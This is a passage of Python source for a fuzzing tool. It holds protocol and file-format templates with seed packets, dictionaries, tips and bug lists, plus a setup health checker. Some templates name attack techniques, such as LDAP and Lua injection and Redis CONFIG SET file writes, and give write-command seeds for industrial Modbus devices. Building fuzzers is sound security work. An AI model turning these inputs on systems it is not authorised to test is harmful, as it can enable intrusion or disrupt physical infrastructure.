                "\x16\x03\x01", "\x16\x03\x03", "\x14", "\x15", "\x17", "\x18",
                "TLS_", "SSL_", "X509", "RSA", "ECDSA", "SHA256", "AES",
            ],
            tips=[
                "Test certificate chain validation",
                "Fuzz extension parsing (SNI, ALPN)",
                "Try malformed handshake messages",
                "Test session resumption handling",
                "Fuzz renegotiation sequences",
            ],
            common_bugs=[
                "Buffer overflow in certificate parsing",
                "Memory corruption in extension handling",
                "Heartbleed-style information leak",
                "Certificate validation bypass",
                "Crash on malformed ASN.1 structures",
                "Padding oracle vulnerabilities",
            ],
            file_extensions=[".pem", ".crt", ".der", ".p12"],
            magic_bytes=[b'\x16\x03', b'-----BEGIN'],
            function_hints=["tls_", "ssl_", "x509", "cert", "handshake", "cipher"],
        ),
        
        "modbus_device": FuzzingTemplate(
            id="modbus_device",
            name="Modbus TCP/RTU",
            category=TemplateCategory.NETWORK,
            description="For Modbus industrial control protocol",
            beginner_description="""
🏭 **Modbus Protocol Template**

Use this for Modbus protocol implementations common in industrial control 
systems (ICS/SCADA). Bugs here can affect physical infrastructure!

**Examples:** PLCs, SCADA systems, industrial gateways, HMIs
            """,
            target_args="",
            timeout_ms=5000,
            memory_limit_mb=256,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # Read Coils (function 0x01), address 0, count 10
                b'\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x0a',
                # Read Holding Registers (function 0x03)
                b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x0a',
                # Write Single Coil (function 0x05)
                b'\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\xff\x00',
                # Write Single Register (function 0x06)
                b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x00\x01',
                # Write Multiple Coils (function 0x0f)
                b'\x00\x01\x00\x00\x00\x08\x01\x0f\x00\x00\x00\x08\x01\xff',
                # Write Multiple Registers (function 0x10)
                b'\x00\x01\x00\x00\x00\x09\x01\x10\x00\x00\x00\x01\x02\x00\x01',
            ],
            dictionary_words=[
                "\x00\x01", "\x00\x02", "\x00\x03", "\x00\x04", "\x00\x05", "\x00\x06",
                "\x00\x0f", "\x00\x10", "\xff\x00", "\x00\x00",
            ],
            tips=[
                "Test function code bounds (0x01-0x7F)",
                "Fuzz register/coil address ranges",
                "Try invalid quantity values",
                "Test exception response handling",
                "Fuzz unit identifier values",
            ],
            common_bugs=[
                "Buffer overflow in write commands",
                "Integer overflow in quantity field",
                "Out-of-bounds register access",
                "Crash on unknown function codes",
                "Authentication bypass",
                "Denial of service via malformed packets",
            ],
            file_extensions=[],
            magic_bytes=[b'\x00\x01\x00\x00'],
            function_hints=["modbus", "register", "coil", "plc", "scada", "function_code"],
        ),
        
        "sip_server": FuzzingTemplate(
            id="sip_server",
            name="SIP/VoIP Server",
            category=TemplateCategory.NETWORK,
            description="For Session Initiation Protocol (VoIP) implementations",
            beginner_description="""
📞 **SIP/VoIP Server Template**

Use this for Voice over IP systems using SIP protocol. VoIP bugs can 
enable eavesdropping, toll fraud, or denial of service attacks.

**Examples:** VoIP servers (Asterisk, FreeSWITCH), IP phones, SIP proxies
            """,
            target_args="",
            timeout_ms=10000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                b'INVITE sip:bob@biloxi.com SIP/2.0\r\nVia: SIP/2.0/UDP pc33.atlanta.com;branch=z9hG4bK776asdhds\r\nTo: Bob <sip:bob@biloxi.com>\r\nFrom: Alice <sip:alice@atlanta.com>;tag=1928301774\r\nCall-ID: a84b4c76e66710@pc33.atlanta.com\r\nCSeq: 314159 INVITE\r\nContact: <sip:alice@pc33.atlanta.com>\r\nContent-Type: application/sdp\r\nContent-Length: 0\r\n\r\n',
                b'REGISTER sip:registrar.biloxi.com SIP/2.0\r\nVia: SIP/2.0/UDP bobspc.biloxi.com:5060\r\nTo: Bob <sip:bob@biloxi.com>\r\nFrom: Bob <sip:bob@biloxi.com>;tag=456248\r\nCall-ID: 843817637684230@998sdasdh09\r\nCSeq: 1826 REGISTER\r\nContact: <sip:bob@192.0.2.4>\r\nExpires: 7200\r\nContent-Length: 0\r\n\r\n',
                b'BYE sip:bob@192.0.2.4 SIP/2.0\r\nVia: SIP/2.0/UDP pc33.atlanta.com\r\nTo: Bob <sip:bob@biloxi.com>;tag=a6c85cf\r\nFrom: Alice <sip:alice@atlanta.com>;tag=1928301774\r\nCall-ID: a84b4c76e66710\r\nCSeq: 231 BYE\r\nContent-Length: 0\r\n\r\n',
                b'OPTIONS sip:bob@biloxi.com SIP/2.0\r\nVia: SIP/2.0/UDP pc33.atlanta.com\r\nTo: <sip:bob@biloxi.com>\r\nFrom: <sip:alice@atlanta.com>;tag=1234\r\nCall-ID: options12345\r\nCSeq: 1 OPTIONS\r\nContent-Length: 0\r\n\r\n',
            ],
            dictionary_words=[
                "INVITE", "ACK", "BYE", "CANCEL", "REGISTER", "OPTIONS", "INFO", "PRACK",
                "SUBSCRIBE", "NOTIFY", "UPDATE", "MESSAGE", "REFER", "PUBLISH",
                "SIP/2.0", "Via:", "To:", "From:", "Call-ID:", "CSeq:", "Contact:",
                "Content-Type:", "Content-Length:", "Max-Forwards:", "Expires:",
                "application/sdp", ";tag=", ";branch=z9hG4bK", "sip:", "sips:",
                "\r\n", "\r\n\r\n", "<", ">", "@",
            ],
            tips=[
                "Test SIP URI parsing thoroughly",
                "Fuzz header field values",
                "Try malformed Via branch parameters",
                "Test dialog state handling",
                "Fuzz SDP body content",
            ],
            common_bugs=[
                "Buffer overflow in URI parsing",
                "Header injection vulnerabilities",
                "Toll fraud via call hijacking",
                "DoS via malformed headers",
                "Auth bypass through header manipulation",
                "Memory corruption in SDP parsing",
            ],
            file_extensions=[".sip", ".sdp"],
            magic_bytes=[b'SIP/2.0', b'INVITE ', b'REGISTER '],
            function_hints=["sip_", "invite", "register", "sdp", "dialog", "transaction"],
        ),
        
        "rtsp_server": FuzzingTemplate(
            id="rtsp_server",
            name="RTSP Media Server",
            category=TemplateCategory.NETWORK,
            description="For Real Time Streaming Protocol implementations",
            beginner_description="""
🎥 **RTSP Media Server Template**

Use this for Real Time Streaming Protocol servers. RTSP is used in 
IP cameras, media servers, and streaming platforms.

**Examples:** IP cameras, NVRs, media servers, streaming applications
            """,
            target_args="",
            timeout_ms=10000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                b'OPTIONS rtsp://example.com/media.mp4 RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Fuzzer\r\n\r\n',
                b'DESCRIBE rtsp://example.com/media.mp4 RTSP/1.0\r\nCSeq: 2\r\nAccept: application/sdp\r\n\r\n',
                b'SETUP rtsp://example.com/media.mp4/track1 RTSP/1.0\r\nCSeq: 3\r\nTransport: RTP/AVP;unicast;client_port=8000-8001\r\n\r\n',
                b'PLAY rtsp://example.com/media.mp4 RTSP/1.0\r\nCSeq: 4\r\nSession: 12345678\r\nRange: npt=0.000-\r\n\r\n',
                b'PAUSE rtsp://example.com/media.mp4 RTSP/1.0\r\nCSeq: 5\r\nSession: 12345678\r\n\r\n',
                b'TEARDOWN rtsp://example.com/media.mp4 RTSP/1.0\r\nCSeq: 6\r\nSession: 12345678\r\n\r\n',
            ],
            dictionary_words=[
                "OPTIONS", "DESCRIBE", "ANNOUNCE", "SETUP", "PLAY", "PAUSE", "TEARDOWN",
                "GET_PARAMETER", "SET_PARAMETER", "REDIRECT", "RECORD",
                "RTSP/1.0", "CSeq:", "Session:", "Transport:", "Range:", "Accept:",
                "RTP/AVP", "unicast", "multicast", "client_port=", "server_port=",
                "interleaved=", "npt=", "application/sdp", "\r\n",
            ],
            tips=[
                "Test RTSP URL parsing edge cases",
                "Fuzz Transport header parameters",
                "Try session hijacking scenarios",
                "Test interleaved data handling",
                "Fuzz Range header parsing",
            ],
            common_bugs=[
                "Buffer overflow in URL parsing",
                "Integer overflow in port numbers",
                "Session fixation/hijacking",
                "DoS via resource exhaustion",
                "Auth bypass in streaming setup",
                "Information leak via DESCRIBE",
            ],
            file_extensions=[".sdp"],
            magic_bytes=[b'RTSP/1.0', b'OPTIONS ', b'DESCRIBE '],
            function_hints=["rtsp_", "stream", "session", "transport", "rtp", "sdp"],
        ),
        
        "ldap_server": FuzzingTemplate(
            id="ldap_server",
            name="LDAP Server/Client",
            category=TemplateCategory.NETWORK,
            description="For LDAP directory services",
            beginner_description="""
📒 **LDAP Server/Client Template**

Use this for Lightweight Directory Access Protocol implementations. 
LDAP is used for authentication and directory services in enterprises.

**Examples:** LDAP servers (OpenLDAP, AD), authentication systems
            """,
            target_args="@@",
            timeout_ms=10000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # Bind request (BER encoded, simplified)
                b'0\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00',
                # Search request skeleton
                b'0\x1e\x02\x01\x02\x63\x19\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x00\x30\x00',
                # Unbind request
                b'0\x05\x02\x01\x03\x42\x00',
            ],
            dictionary_words=[
                "cn=", "dc=", "ou=", "uid=", "objectClass=", "(", ")", "&", "|", "!",
                "*", "\\00", "\\2a", "\\28", "\\29", "\\5c", "admin", "root", "user",
            ],
            tips=[
                "Test LDAP filter injection",
                "Fuzz BER/DER encoding edge cases",
                "Try blind LDAP injection",
                "Test search size/time limits",
                "Fuzz DN (Distinguished Name) parsing",
            ],
            common_bugs=[
                "LDAP injection in filters",
                "Buffer overflow in DN parsing",
                "Integer overflow in BER length",
                "Auth bypass via null bind",
                "Information leak via error messages",
                "DoS via complex search filters",
            ],
            file_extensions=[".ldif"],
            magic_bytes=[b'\x30'],  # BER sequence tag
            function_hints=["ldap_", "bind", "search", "filter", "dn", "ber"],
        ),
        
        "redis_server": FuzzingTemplate(
            id="redis_server",
            name="Redis Protocol (RESP)",
            category=TemplateCategory.NETWORK,
            description="For Redis servers and RESP protocol implementations",
            beginner_description="""
🗄️ **Redis Protocol Template**

Use this for Redis database servers and clients. Redis is widely used 
for caching and session storage, making it a valuable target.

**Examples:** Redis servers, caching layers, session stores
            """,
            target_args="",
            timeout_ms=5000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                b'*1\r\n$4\r\nPING\r\n',
                b'*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$5\r\nvalue\r\n',
                b'*2\r\n$3\r\nGET\r\n$3\r\nkey\r\n',
                b'*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n',
                b'*1\r\n$4\r\nINFO\r\n',
                b'*1\r\n$6\r\nCONFIG\r\n',
                b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$4\r\n/tmp\r\n',
            ],
            dictionary_words=[
                "PING", "SET", "GET", "DEL", "KEYS", "INFO", "CONFIG", "AUTH", "SELECT",
                "EVAL", "EVALSHA", "SCRIPT", "CLIENT", "DEBUG", "SLAVEOF", "REPLICAOF",
                "*", "$", "+", "-", ":", "\r\n", "OK", "QUEUED",
            ],
            tips=[
                "Test Lua script injection via EVAL",
                "Fuzz CONFIG SET for file writes",
                "Try CLIENT KILL commands",
                "Test replication commands",
                "Fuzz module loading if enabled",
            ],
            common_bugs=[
                "Command injection via Lua scripts",
                "Arbitrary file write via CONFIG",
                "Auth bypass vulnerabilities",
                "Integer overflow in bulk strings",
                "DoS via KEYS with patterns",
                "Memory exhaustion attacks",
            ],
            file_extensions=[".rdb", ".aof"],
            magic_bytes=[b'*', b'$', b'+', b'-', b':'],
            function_hints=["redis", "resp", "command", "reply", "bulk", "array"],
        ),
        
        "coap_server": FuzzingTemplate(
            id="coap_server",
            name="CoAP IoT Protocol",
            category=TemplateCategory.NETWORK,
            description="For Constrained Application Protocol (CoAP) implementations",
            beginner_description="""
📡 **CoAP IoT Protocol Template**

Use this for Constrained Application Protocol implementations. CoAP is 
designed for IoT devices with limited resources.

**Examples:** IoT gateways, smart home devices, constrained sensors
            """,
            target_args="",
            timeout_ms=5000,
            memory_limit_mb=256,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # CoAP GET request
                b'\x40\x01\x00\x01\xb4test',
                # CoAP POST request with payload
                b'\x40\x02\x00\x02\xb4test\xff{"data":"value"}',
                # CoAP PUT request
                b'\x40\x03\x00\x03\xb4test\xff{"update":true}',
                # CoAP DELETE request
                b'\x40\x04\x00\x04\xb4test',
                # CoAP with observe option
                b'\x40\x01\x00\x05\x60\xb4test',
            ],
            dictionary_words=[
                "\x40", "\x50", "\x60", "\x70",  # Message types
                "\x01", "\x02", "\x03", "\x04", "\x05",  # Method codes
                "\xff",  # Payload marker
                "test", "sensor", "actuator", "well-known", "core",
            ],
            tips=[
                "Test option parsing edge cases",
                "Fuzz block-wise transfers",
                "Try observe notification flooding",
                "Test multicast handling",
                "Fuzz proxy-uri option",
            ],
            common_bugs=[
                "Buffer overflow in option parsing",
                "Integer overflow in block size",
                "Memory exhaustion via observe",
                "Crash on malformed tokens",
                "DoS via multicast amplification",
                "Path traversal in resource URIs",
            ],
            file_extensions=[],
            magic_bytes=[b'\x40', b'\x50', b'\x60'],
            function_hints=["coap_", "option", "observe", "block", "token", "resource"],
        ),
        
        # === CLI TOOLS ===
        "cli_file_processor": FuzzingTemplate(
            id="cli_file_processor",
            name="CLI File Processor",
            category=TemplateCategory.CLI_TOOLS,
            description="For command-line tools that process files",
            beginner_description="""
⌨️ **CLI File Processor Template**

Use this for command-line utilities that take a file as input. These are 
often simpler to fuzz and can reveal interesting bugs quickly.

**Examples:** grep, sort, diff, awk, sed, file converters
            """,
            target_args="@@",
            timeout_ms=3000,
            memory_limit_mb=256,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                b'test data\n',
                b'line1\nline2\nline3\n',
                b'key=value\n',
            ],
            dictionary_words=[],
            tips=[
                "Start with simple text files",
                "Include files with no newline at end",
                "Try binary data mixed with text",
                "Test with empty files",
            ],
            common_bugs=[
                "Buffer overflow on long lines",
                "Null byte handling issues",
                "Memory exhaustion on large files",
                "Off-by-one in line counting",
            ],
            file_extensions=[".txt", ".log", ".csv", ".dat"],
            magic_bytes=[],
            function_hints=["read", "parse", "process", "line", "file"],
        ),
        
        "cli_arg_parser": FuzzingTemplate(
            id="cli_arg_parser",
            name="CLI Argument Parser",
            category=TemplateCategory.CLI_TOOLS,
            description="For programs with complex command-line argument handling",
            beginner_description="""
🔧 **CLI Argument Parser Template**

Use this to fuzz a program's command-line argument parsing. Bugs here can 
sometimes be exploited by tricking users into running malicious commands.

**Examples:** Any program with complex argument handling
            """,
            target_args="",  # Arguments will be fuzzed
            timeout_ms=2000,
            memory_limit_mb=256,
            mode=FuzzingMode.DUMB,
            example_seeds=[
                b'--help',
                b'-v -o output.txt input.txt',
                b'--config=/path/to/file --verbose',
            ],
            tips=[
                "Include both short and long options",
                "Test with very long argument values",
                "Try special characters in values",
                "Test option combinations",
            ],
            common_bugs=[
                "Buffer overflow in option value",
                "Format string in verbose output",
                "Path traversal in file options",
                "Integer overflow in numeric options",
            ],
            file_extensions=[],
            magic_bytes=[],
            function_hints=["getopt", "argparse", "argv", "option", "flag"],
        ),
        
        # === COMPRESSION ===
        "zip_handler": FuzzingTemplate(
            id="zip_handler",
            name="ZIP Archive Handler",
            category=TemplateCategory.COMPRESSION,
            description="For programs that read or extract ZIP archives",
            beginner_description="""
📦 **ZIP Archive Template**

Use this for programs that handle ZIP files. Archive handlers are common 
vulnerability targets due to complex format parsing.

**Examples:** Unzip utilities, archive managers, backup tools
            """,
            target_args="@@",
            timeout_ms=5000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # Minimal empty ZIP
                b'PK\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
            ],
            dictionary_words=["PK", "\x03\x04", "\x01\x02", "\x05\x06"],
            tips=[
                "Include nested archives",
                "Test with zip bombs (carefully!)",
                "Try path traversal in filenames",
                "Include encrypted entries",
            ],
            common_bugs=[
                "Path traversal (zip slip)",
                "Integer overflow in file size",
                "Heap overflow in decompression",
                "Symlink attacks",
            ],
            file_extensions=[".zip", ".jar", ".apk", ".docx", ".xlsx"],
            magic_bytes=[b'PK\x03\x04', b'PK\x05\x06'],
            function_hints=["zip_", "unzip", "inflate", "deflate", "archive"],
        ),
        
        "gzip_handler": FuzzingTemplate(
            id="gzip_handler",
            name="GZIP/Compression Handler",
            category=TemplateCategory.COMPRESSION,
            description="For programs that handle gzip, zlib, or similar compression",
            beginner_description="""
🗜️ **GZIP Compression Template**

Use this for programs that decompress gzip or zlib data. Decompression 
bugs can lead to memory corruption vulnerabilities.

**Examples:** Gzip utilities, web servers, HTTP clients
            """,
            target_args="@@",
            timeout_ms=3000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # Minimal gzip
                b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00',
            ],
            dictionary_words=[],
            tips=[
                "Include corrupted compressed data",
                "Test with truncated streams",
                "Try multiple concatenated streams",
            ],
            common_bugs=[
                "Heap overflow in decompression",
                "Integer overflow in size calculation",
                "Out-of-bounds read in Huffman decoding",
            ],
            file_extensions=[".gz", ".tgz", ".z"],
            magic_bytes=[b'\x1f\x8b'],
            function_hints=["gzip", "gunzip", "inflate", "zlib", "compress"],
        ),
        
        # === CRYPTO ===
        "certificate_parser": FuzzingTemplate(
            id="certificate_parser",
            name="X.509 Certificate Parser",
            category=TemplateCategory.CRYPTO,
            description="For programs that parse X.509 certificates",
            beginner_description="""
🔐 **Certificate Parser Template**

Use this for programs that handle SSL/TLS certificates. Certificate parsing 
bugs can lead to authentication bypasses and remote code execution.

**Examples:** TLS libraries, certificate validators, web browsers
            """,
            target_args="@@",
            timeout_ms=5000,
            memory_limit_mb=256,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[],
            dictionary_words=["CERTIFICATE", "BEGIN", "END", "-----"],
            tips=[
                "Include malformed ASN.1 structures",
                "Test with unexpected extensions",
                "Try oversized field values",
            ],
            common_bugs=[
                "Integer overflow in ASN.1 length",
                "Buffer overflow in extension parsing",
                "Null byte injection in subject names",
                "Memory corruption in chain validation",
            ],
            file_extensions=[".pem", ".crt", ".cer", ".der"],
            magic_bytes=[b'-----BEGIN'],
            function_hints=["x509", "certificate", "asn1", "der", "pem"],
        ),
        
        # === MEDIA ===
        "audio_parser": FuzzingTemplate(
            id="audio_parser",
            name="Audio File Parser",
            category=TemplateCategory.MEDIA,
            description="For programs that decode audio files",
            beginner_description="""
🎵 **Audio Parser Template**

Use this for audio players and converters. Audio formats like MP3 and WAV 
have complex parsing that can contain bugs.

**Examples:** Audio players, converters, metadata extractors
            """,
            target_args="@@",
            timeout_ms=5000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # Minimal WAV header
                b'RIFF$\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00D\xac\x00\x00\x88X\x01\x00\x02\x00\x10\x00data\x00\x00\x00\x00',
            ],
            dictionary_words=["RIFF", "WAVE", "fmt ", "data", "ID3", "TAG"],
            tips=[
                "Include different sample rates and bit depths",
                "Test with corrupted headers",
                "Try embedded metadata (ID3, etc.)",
            ],
            common_bugs=[
                "Integer overflow in sample calculations",
                "Heap overflow in codec decompression",
                "Out-of-bounds in metadata parsing",
            ],
            file_extensions=[".wav", ".mp3", ".flac", ".ogg", ".aac", ".m4a"],
            magic_bytes=[b'RIFF', b'ID3', b'\xff\xfb', b'fLaC', b'OggS'],
            function_hints=["audio", "wav", "mp3", "decode", "sample", "pcm"],
        ),
        
        "video_parser": FuzzingTemplate(
            id="video_parser",
            name="Video File Parser",
            category=TemplateCategory.MEDIA,
            description="For programs that decode video files",
            beginner_description="""
🎬 **Video Parser Template**

Use this for video players and converters. Video codecs are extremely complex 
and historically full of vulnerabilities.

**Examples:** Video players, converters, thumbnail generators
            """,
            target_args="@@",
            timeout_ms=15000,  # Videos can be slow
            memory_limit_mb=1024,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[],
            dictionary_words=["moov", "mdat", "ftyp", "avc1", "mp4a"],
            tips=[
                "Use very short video clips",
                "Include different codecs (H.264, VP9, etc.)",
                "Test with corrupted frame data",
            ],
            common_bugs=[
                "Heap overflow in frame decoding",
                "Integer overflow in timestamp handling",
                "Use-after-free in codec state",
                "Out-of-bounds in motion vector parsing",
            ],
            file_extensions=[".mp4", ".avi", ".mkv", ".webm", ".mov"],
            magic_bytes=[b'ftyp', b'RIFF', b'\x1aE\xdf\xa3'],
            function_hints=["video", "codec", "frame", "decode", "h264", "avc"],
        ),
    }
    
    def __init__(self):
        pass
    
    def get_all_templates(self) -> List[Dict[str, Any]]:
        """Get all available templates."""
        return [t.to_dict() for t in self.TEMPLATES.values()]
    
    def get_template(self, template_id: str) -> Optional[FuzzingTemplate]:
        """Get a specific template by ID."""
        return self.TEMPLATES.get(template_id)
    
    def get_templates_by_category(self, category: TemplateCategory) -> List[FuzzingTemplate]:
        """Get all templates in a category."""
        return [t for t in self.TEMPLATES.values() if t.category == category]
    
    def find_matching_templates(self, binary_analysis: BinaryAnalysisResult) -> List[Tuple[FuzzingTemplate, float]]:
        """
        Find templates that match a binary based on analysis.
        
        Returns list of (template, confidence) tuples sorted by confidence.
        """
        matches = []
        
        for template in self.TEMPLATES.values():
            confidence = 0.0
            
            # Check function hints
            for func in binary_analysis.input_functions + binary_analysis.file_operations:
                for hint in template.function_hints:
                    if hint.lower() in func.lower():
                        confidence += 0.2
            
            # Check magic bytes in detected magic values (if we had them)
            # For now, use file operations as proxy
            
            # Check binary type match
            if binary_analysis.binary_type == BinaryType.FILE_PARSER and \
               template.category in [TemplateCategory.FILE_PARSERS, TemplateCategory.DOCUMENTS, 
                                    TemplateCategory.MEDIA, TemplateCategory.COMPRESSION]:
                confidence += 0.3
            
            if binary_analysis.binary_type == BinaryType.NETWORK_SERVICE and \
               template.category == TemplateCategory.NETWORK:
                confidence += 0.4
            
            if binary_analysis.binary_type == BinaryType.CLI_TOOL and \
               template.category == TemplateCategory.CLI_TOOLS:
                confidence += 0.3
            
            if confidence > 0:
                matches.append((template, min(1.0, confidence)))
        
        # Sort by confidence descending
        matches.sort(key=lambda x: -x[1])
        return matches
    
    def get_seeds_for_template(self, template_id: str) -> List[bytes]:
        """Get example seeds for a template."""
        template = self.TEMPLATES.get(template_id)
        if template:
            return template.example_seeds
        return []
    
    def get_dictionary_for_template(self, template_id: str) -> List[str]:
        """Get dictionary words for a template."""
        template = self.TEMPLATES.get(template_id)
        if template:
            return template.dictionary_words
        return []
    
    def apply_template(self, template_id: str) -> Dict[str, Any]:
        """Apply a template and return the configuration."""
        template = self.TEMPLATES.get(template_id)
        if not template:
            return {"error": f"Template not found: {template_id}"}
        
        return {
            "target_args": template.target_args,
            "timeout_ms": template.timeout_ms,
            "memory_limit_mb": template.memory_limit_mb,
            "mode": template.mode.value,
            "use_qemu": template.use_qemu,
            "seeds": [base64.b64encode(s).decode() for s in template.example_seeds],
            "dictionary": template.dictionary_words,
            "tips": template.tips,
            "common_bugs": template.common_bugs,
        }


# =============================================================================
# HEALTH CHECKS (Beginner Feature 4)
# =============================================================================

class HealthCheckSeverity(str, Enum):
    """Severity levels for health check issues."""
    ERROR = "error"      # Cannot proceed
    WARNING = "warning"  # Can proceed but may have issues
    INFO = "info"        # FYI, not a problem
    OK = "ok"            # Check passed


@dataclass
class HealthCheckResult:
    """Result of a single health check."""
    check_name: str
    passed: bool
    severity: HealthCheckSeverity
    message: str
    details: str  # Beginner-friendly explanation
    fix_suggestion: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "check_name": self.check_name,
            "passed": self.passed,
            "severity": self.severity.value,
            "message": self.message,
            "details": self.details,
            "fix_suggestion": self.fix_suggestion,
        }


@dataclass
class HealthCheckReport:
    """Complete health check report."""
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    overall_status: str = "unknown"
    can_proceed: bool = False
    checks: List[HealthCheckResult] = field(default_factory=list)
    summary: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "timestamp": self.timestamp,
            "overall_status": self.overall_status,
            "can_proceed": self.can_proceed,
            "checks": [c.to_dict() for c in self.checks],
            "summary": self.summary,
            "total_checks": len(self.checks),
            "passed_checks": sum(1 for c in self.checks if c.passed),
            "failed_checks": sum(1 for c in self.checks if not c.passed),
        }


class FuzzingHealthChecker:
    """
    Validates fuzzing setup before starting.
    
    Checks for common issues that could prevent successful fuzzing
    or cause poor results. Provides beginner-friendly explanations
    and fix suggestions.
    """
    
    def __init__(
        self,
        target_path: str,
        target_args: str = "@@",
        seed_dir: Optional[str] = None,
        output_dir: Optional[str] = None,
        timeout_ms: int = 5000,
        memory_limit_mb: int = 256,
    ):
        self.target_path = target_path
        self.target_args = target_args
        self.seed_dir = seed_dir
        self.output_dir = output_dir
        self.timeout_ms = timeout_ms
        self.memory_limit_mb = memory_limit_mb
        
        self.report = HealthCheckReport()
    
    def run_all_checks(self) -> HealthCheckReport:
        """Run all health checks and return a report."""
        self.report = HealthCheckReport()
        
        # Run all checks
        self._check_target_exists()
        self._check_target_executable()
        self._check_target_readable()
        self._check_target_not_script()
        self._check_seeds_exist()
        self._check_seeds_not_empty()
        self._check_seeds_reasonable_size()
        self._check_output_directory()
        self._check_disk_space()
        self._check_timeout_reasonable()
        self._check_memory_limit()
        self._check_args_placeholder()
        self._check_target_runs()
        
        # Calculate overall status
        self._calculate_overall_status()
        
        return self.report
    
    def _add_check(self, result: HealthCheckResult):
        """Add a check result to the report."""
        self.report.checks.append(result)
    
    def _check_target_exists(self):
        """Check if the target binary exists."""
        exists = os.path.exists(self.target_path)
        
        self._add_check(HealthCheckResult(
            check_name="Target Exists",
            passed=exists,
            severity=HealthCheckSeverity.ERROR if not exists else HealthCheckSeverity.OK,
            message="Target binary found" if exists else "Target binary not found",
            details=f"Looking for: {self.target_path}" if not exists else 
                   f"Found target at: {self.target_path}",
            fix_suggestion="Check the path to your binary. Make sure you uploaded it or entered the correct path." if not exists else None,
        ))
    
    def _check_target_executable(self):
        """Check if the target is executable."""
        if not os.path.exists(self.target_path):
            return
        
        is_exec = os.access(self.target_path, os.X_OK)
        
        self._add_check(HealthCheckResult(
            check_name="Target Executable",
            passed=is_exec,
            severity=HealthCheckSeverity.ERROR if not is_exec else HealthCheckSeverity.OK,
            message="Target is executable" if is_exec else "Target is not executable",
            details="The program has execute permissions" if is_exec else
                   "The program doesn't have execute permissions, so it can't be run",
            fix_suggestion="Run 'chmod +x <binary>' on Linux/Mac, or check file properties on Windows" if not is_exec else None,
        ))
    
    def _check_target_readable(self):
        """Check if we can read the target."""
        if not os.path.exists(self.target_path):
            return
        
        is_readable = os.access(self.target_path, os.R_OK)
        
        self._add_check(HealthCheckResult(
            check_name="Target Readable",
            passed=is_readable,
            severity=HealthCheckSeverity.ERROR if not is_readable else HealthCheckSeverity.OK,
            message="Target is readable" if is_readable else "Cannot read target",
            details="We can read the binary file" if is_readable else
                   "We don't have permission to read the binary file",
            fix_suggestion="Check file permissions. You may need to run as administrator/root." if not is_readable else None,
        ))
    
    def _check_target_not_script(self):
        """Check if the target is a native binary, not a script."""
        if not os.path.exists(self.target_path):
            return
        
        try:
            with open(self.target_path, "rb") as f:
                header = f.read(2)
            
            is_script = header == b"#!"
            
            self._add_check(HealthCheckResult(
                check_name="Target Type",
                passed=not is_script,
                severity=HealthCheckSeverity.WARNING if is_script else HealthCheckSeverity.OK,
                message="Target is a native binary" if not is_script else "Target appears to be a script",
                details="This is a compiled program suitable for binary fuzzing" if not is_script else
                       "This looks like a script file. Binary fuzzing works best on compiled programs.",
                fix_suggestion="Consider using a specialized fuzzer for this script type, or fuzz the interpreter instead" if is_script else None,
            ))
        except:
            pass
    
    def _check_seeds_exist(self):
        """Check if seed directory exists and has files."""
        if not self.seed_dir:
            self._add_check(HealthCheckResult(
                check_name="Seeds Provided",
                passed=False,
                severity=HealthCheckSeverity.WARNING,
                message="No seed directory specified",
                details="Seeds are example inputs that help the fuzzer start. Without seeds, the fuzzer will start from scratch, which is slower.",
                fix_suggestion="Provide a directory with example input files, or let us generate basic seeds",
            ))
            return
        
        exists = os.path.isdir(self.seed_dir)
        
        self._add_check(HealthCheckResult(
            check_name="Seed Directory Exists",
            passed=exists,
            severity=HealthCheckSeverity.WARNING if not exists else HealthCheckSeverity.OK,
            message="Seed directory found" if exists else "Seed directory not found",
            details=f"Found seeds at: {self.seed_dir}" if exists else
                   f"Directory not found: {self.seed_dir}",
            fix_suggestion="Create the directory and add some example input files" if not exists else None,
        ))
    
    def _check_seeds_not_empty(self):
        """Check if seeds directory has files."""
        if not self.seed_dir or not os.path.isdir(self.seed_dir):
            return
        
        files = [f for f in os.listdir(self.seed_dir) if os.path.isfile(os.path.join(self.seed_dir, f))]
        has_seeds = len(files) > 0
        
        self._add_check(HealthCheckResult(
            check_name="Seeds Present",
            passed=has_seeds,
            severity=HealthCheckSeverity.WARNING if not has_seeds else HealthCheckSeverity.OK,
            message=f"Found {len(files)} seed file(s)" if has_seeds else "Seed directory is empty",
            details=f"Seeds: {', '.join(files[:5])}{'...' if len(files) > 5 else ''}" if has_seeds else
                   "No seed files found in the directory",
            fix_suggestion="Add some example input files to the seed directory" if not has_seeds else None,
        ))
    
